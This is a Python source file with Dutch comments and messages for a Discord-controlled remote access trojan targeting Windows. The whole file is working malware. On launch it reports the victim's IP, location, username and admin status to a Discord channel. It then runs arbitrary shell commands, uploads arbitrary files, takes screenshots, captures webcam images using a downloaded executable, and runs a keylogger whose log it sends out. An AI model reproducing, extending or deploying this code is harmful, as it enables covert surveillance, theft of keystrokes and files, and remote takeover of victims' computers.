# dani tot regel 150
import winreg
import ctypes
import sys
import os
import random
import time
import subprocess
import discord
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from discord.ext import commands
from ctypes import *
import asyncio
from discord import utils

token = ''
global appdata
appdata = os.getenv('APPDATA')
client = discord.Client()
bot = commands.Bot(command_prefix='!')
helpmenu = """
Lijst me commands:

--> !message = Toon een berichtvenster met  tekst/ Syntaxis = "!message example"
--> !shell = Voer een shell-opdracht uit   = "!shell whoami"
--> !webcampic = Maak een foto van de webcam
--> !windowstart = Start het loggen van het huidige gebruiker (loggen wordt getoond in de botactiviteit)
--> !windowstop = Stop het loggen van het huidige gebruiker
--> !admincheck = Controleer of je admin rechten hebt
--> !sysinfo = Geeft informatie over de computer
--> !geolocate = Geolokaliseer de computer met behulp van de breedte- en lengtegraad van het ip-adres met google map / Waarschuwing: het geolokaliseren van IP-adressen is niet erg nauwkeurig
--> !startkeylogger = Start een keylogger / Waarschuwing: Waarschijnlijk wordt AV geactiveerd
--> !download = Download een bestand van een geïnfecteerde computer
--> !stopkeylogger = Stopt keylogger
--> !dumpkeylogger = Dumpt de keylog
--> !idletime = De inactieve tijd van de gebruiker ophalen
--> !screenshot = Maakt een screenshot van het scherm van de gebruiker
--> !exit = Programma afsluiten
--> !kill = Beëindig de sessie of alle sessies behalve de huidige / Syntaxis = "!kill session-3" of "!kill all"
"""


async def activity(client):
    import time
    import win32gui
    while True:
        global stop_threads
        if stop_threads:
            break
        window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        game = discord.Game(f"Visiting: {window}")
        await client.change_presence(status=discord.Status.online, activity=game)
        time.sleep(1)


def between_callback(client):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(activity(client))
    loop.close()


@client.event
async def on_ready():
    import platform
    import re
    import urllib.request
    import json
    with urllib.request.urlopen("https://geolocation-db.com/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country_code']
        ip = data['IPv4']
    import os
    on_ready.total = []
    global number
    number = 0
    global channel_name
    channel_name = None
    for x in client.get_all_channels():  # From here we look through all the channels,check for the biggest number and then add one to it
        (on_ready.total).append(x.name)
    for y in range(len(on_ready.total)):  # Probably a better way to do this
        if "session" in on_ready.total[y]:
            import re
            result = [e for e in re.split("[^0-9]", on_ready.total[y]) if e != '']
            biggest = max(map(int, result))
            number = biggest + 1
        else:
            pass
    if number == 0:
        channel_name = "session-1"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    else:
        channel_name = f"session-{number}"
        newchannel = await client.guilds[0].create_text_channel(channel_name)
    channel_ = discord.utils.get(client.get_all_channels(), name=channel_name)
    channel = client.get_channel(channel_.id)
    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    value1 = f"@here :white_check_mark: New session opened {channel_name} | {platform.system()} {platform.release()} | {ip} :flag_{flag.lower()}: | User : {os.getlogin()}"
    if is_admin == True:
        await channel.send(f'{value1} | :gem:')
    elif is_admin == False:
        await channel.send(value1)
    game = discord.Game(f"Window logging gestopt")
    await client.change_presence(status=discord.Status.online, activity=game)


@client.event
async def on_message(message):
    if message.channel.name != channel_name:
        pass
    else:
        if message.content.startswith("!kill"):
            if message.content[6:] == "all":
                for y in range(len(on_ready.total)):
                    if "session" in on_ready.total[y]:
                        channel_to_delete = discord.utils.get(client.get_all_channels(), name=on_ready.total[y])
                        await channel_to_delete.delete()
                    else:
                        pass
            else:
                try:
                    channel_to_delete = discord.utils.get(client.get_all_channels(), name=message.content[6:])
                    await channel_to_delete.delete()
                    await message.channel.send(f"[*] {message.content[6:]} killed.")
                except:
                    await message.channel.send(
                        f"[!] {message.content[6:]} is invalid,please enter a valid session name")

        if message.content == "!dumpkeylogger":
            import os
            temp = os.getenv("TEMP")
            file_keys = os.path.join(os.getenv('TEMP') + "\\key_log.txt")
            file = discord.File(file_keys, filename=file_keys)
            await message.channel.send("[*] Opdracht succesvol uitgevoerd", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\key_log.txt"))

        if message.content == "!exit":
            exit()

        if message.content == "!windowstart":
            import threading
            global stop_threads
            stop_threads = False
            global _thread
            _thread = threading.Thread(target=between_callback, args=(client,))
            _thread.start()
            await message.channel.send("[*] Window logging voor deze sessie gestart")

        if message.content == "!windowstop":
            stop_threads = True
            await message.channel.send("[*] Window logging voor deze sessie gestopt")
            game = discord.Game(f"Window logging gestopt")
            await client.change_presence(status=discord.Status.online, activity=game)
        # ahmet tot 256
        if message.content == "!screenshot":
            import os
            from mss import mss
            with mss() as sct:
                sct.shot(output=os.path.join(os.getenv('TEMP') + "\\monitor.png"))
            file = discord.File(os.path.join(os.getenv('TEMP') + "\\monitor.png"), filename="monitor.png")
            await message.channel.send("[*] Opdracht succesvol uitgevoerd", file=file)
            os.remove(os.path.join(os.getenv('TEMP') + "\\monitor.png"))

        if message.content == "!webcampic":  # Downloads a file over internet which is not great but avoids using opencv/numpy which helps reducing final exe file if compiled
            import os
            import urllib.request
            from zipfile import ZipFile
            directory = os.getcwd()
            try:
                os.chdir(os.getenv('TEMP'))
                urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", "temp.zip")
                with ZipFile("temp.zip") as zipObj:
                    zipObj.extractall()
                os.system("WebCamImageSave.exe /capture /FileName temp.png")
                file = discord.File("temp.png", filename="temp.png")
                await message.channel.send("[*] Opdracht succesvol uitgevoerd", file=file)
                os.remove("temp.zip")
                os.remove("temp.png")
                os.remove("WebCamImageSave.exe")
                os.remove("readme.txt")
                os.remove("WebCamImageSave.chm")
                os.chdir(directory)
            except:
                await message.channel.send("[!] Opdracht mislukt ")

        if message.content.startswith("!message"):
            import ctypes
            import time
            MB_YESNO = 0x04
            MB_HELP = 0x4000
            ICON_STOP = 0x10

            def mess():
                ctypes.windll.user32.MessageBoxW(0, message.content[8:], "Eror",
                                                 MB_HELP | MB_YESNO | ICON_STOP)  # Show message box

            import threading
            messa = threading.Thread(target=mess)
            messa._running = True
            messa.daemon = True
            messa.start()
            import win32con
            import win32gui
            import time
            time.sleep(1)
            hwnd = win32gui.FindWindow(None, "Error")
            win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)  # Put message to foreground
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
            win32gui.SetWindowPos(hwnd, win32con.HWND_NOTOPMOST, 0, 0, 0, 0,
                                  win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)

        if message.content.startswith("!download"):
            file = discord.File(message.content[10:], filename=message.content[10:])
            await message.channel.send("[*] Command successfully executed", file=file)

        if message.content.startswith("!shell"):
            global status
            import time
            status = None
            import subprocess
            import os
            instruction = message.content[7:]

            def shell():
                output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                global status
                status = "ok"
                return output

            import threading
            shel = threading.Thread(
                target=shell)  # Use of threading and a global variable to avoid hanging if command is too long to produce an output (probably a better way to do this)
            shel._running = True
            shel.start()
            time.sleep(1)
            shel._running = False
            if status:
                result = str(shell().stdout.decode('CP437'))  # CP437 Decoding used for characters like " é " etc..
                print(result)
                numb = len(result)
                print(numb)
                if numb < 1:
                    await message.channel.send("[*] Opdracht niet herkend of geen uitvoer verkregen")
                elif numb > 1990:
                    f1 = open("output.txt", 'a')
                    f1.write(result)
                    f1.close()
                    file = discord.File("output.txt", filename="output.txt")
                    await message.channel.send("[*] Opdracht succesvol uitgevoerd", file=file)
                    os.popen("del output.txt")
                else:
                    await message.channel.send("[*] Opdracht succesvol uitgevoerd : " + result)
            else:
                await message.channel.send("[*] Opdracht niet herkend of geen uitvoer verkregen")
                status = None
        # moustafa eind

        if message.content == "!help":
            await message.channel.send(helpmenu)


        if message.content == "!sysinfo":
            import platform
            info = platform.uname()
            info_total = f'{info.system} {info.release} {info.machine}'
            from requests import get
            ip = get('https://api.ipify.org').text
            await message.channel.send(f"[*] Opdracht succesvol uitgevoerd : {info_total} {ip}")

        if message.content == "!geolocate":
            import urllib.request
            import json
            with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                data = json.loads(url.read().decode())
                link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                await message.channel.send("[*] Opdracht succesvol uitgevoerd : " + link)

        if message.content == "!admincheck":
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                await message.channel.send("[*] Je bent admin")
            elif is_admin == False:
                await message.channel.send("[!] Je ben geen admin")

        if message.content == "!startkeylogger":
            import base64
            import os
            from pynput.keyboard import Key, Listener
            import logging
            temp = os.getenv("TEMP")
            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
                                level=logging.DEBUG, format='%(asctime)s: %(message)s')

            def keylog():
                def on_press(key):
                    logging.info(str(key))

                with Listener(on_press=on_press) as listener:
                    listener.join()

            import threading
            global test
            test = threading.Thread(target=keylog)
            test._running = True
            test.daemon = True
            test.start()
            await message.channel.send("[*] Keylogger succesvol gestart")

        if message.content == "!stopkeylogger":
            import os
            test._running = False
            await message.channel.send("[*] Keylogger succesvol gestopt")

        if message.content == "!idletime":
            class LASTINPUTINFO(Structure):
                _fields_ = [
                    ('cbSize', c_uint),
                    ('dwTime', c_int),
                ]

            def get_idle_duration():
                lastInputInfo = LASTINPUTINFO()
                lastInputInfo.cbSize = sizeof(lastInputInfo)
                if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
                    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
                    return millis / 1000.0
                else:
                    return 0

            import threading
            global idle1
            idle1 = threading.Thread(target=get_idle_duration)
            idle1._running = True
            idle1.daemon = True
            idle1.start()
            duration = get_idle_duration()
            await message.channel.send('User idle for %.2f seconds.' % duration)
            import time
            time.sleep(1)


client.run(token)
